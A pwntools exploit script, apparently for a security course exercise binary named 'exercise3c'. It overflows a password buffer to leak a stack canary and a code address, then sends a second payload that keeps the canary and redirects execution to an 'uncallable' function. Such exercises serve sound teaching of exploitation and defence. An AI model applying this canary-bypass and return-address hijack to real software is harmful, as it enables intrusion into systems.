#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
b *check_authorization+50
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()


# You can now communicate with the process, e.g.,

# Be careful on this, don't write something that stuck u :D
init_output = r.recvuntil("password:")
# print(init_output)
#log.info(f"Initial data receied: {init_output}"  )
exploit = b""
# Fill the buffer 124
exploit += b"A" * 159

r.sendline(exploit)
# Fill the alliance

r.recvline()
r.recvline()
data = r.recvline()
#print(data)
canary = data[:4]
#print(canary)
address = data[4:10]
#print(address)

# print hello raw = 00101287
# uncallable raw  = 00101269
# uncallable = print hello - 18(hex) = 24(decimal)

exploit = b""
exploit += b"A" * 160
exploit += canary
exploit += b"B" * 36

address = address.hex()
address = bytearray.fromhex(address)
address.reverse()
address = bytes(address)
address = address.hex()

addint = int(address, 16) - 24
address = hex(addint)
#print(address)
address = address[2:]
# # Addr of the uncallable
# # Distance = 8 to d8, or d0
address = bytearray.fromhex("0000"+address)
address.reverse()


#print(address)

exploit += address
r.sendline(exploit)

#result = r.recvall()

r.recvline()
r.recvline()
r.recvline()
result = r.recvline()
print(result)



# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
